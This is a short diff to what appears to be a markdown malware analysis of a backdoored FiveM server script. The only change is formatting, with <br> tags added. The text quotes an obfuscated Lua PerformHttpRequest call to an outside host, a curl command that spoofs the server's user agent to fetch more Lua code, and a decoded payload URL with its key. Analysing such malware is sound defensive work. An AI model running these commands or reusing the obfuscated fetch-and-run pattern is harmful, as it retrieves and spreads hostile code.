@@ -53,10 +53,9 @@ PerformHttpRequest("https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\
 You can verify on linux using this command:
 `curl https://fivem.kvac.cz/f.php?key=ojoTJZWePRnPKYUpA6z4 -A "FXServer/PerformHttpRequest"`
 
-As we can see we get more lua code, if we extract the link
-`https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\x6a\x34\x6c\x5a\x65\x79\x76\x57\x4a\x6e\x61\x33\x50\x69\x7a\x71\x4f\x6b`
-and translate it to text:
-`https://fivem.kvac.cz/_/api.php?key=3Rj4lZeyvWJna3PizqOk`
+As we can see we get more lua code, if we extract the link <br> `https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\x6a\x34\x6c\x5a\x65\x79\x76\x57\x4a\x6e\x61\x33\x50\x69\x7a\x71\x4f\x6b`
+
+and translate it to text: <br> `https://fivem.kvac.cz/_/api.php?key=3Rj4lZeyvWJna3PizqOk`
 
 cURL-ing this link grants us the payload code:
 
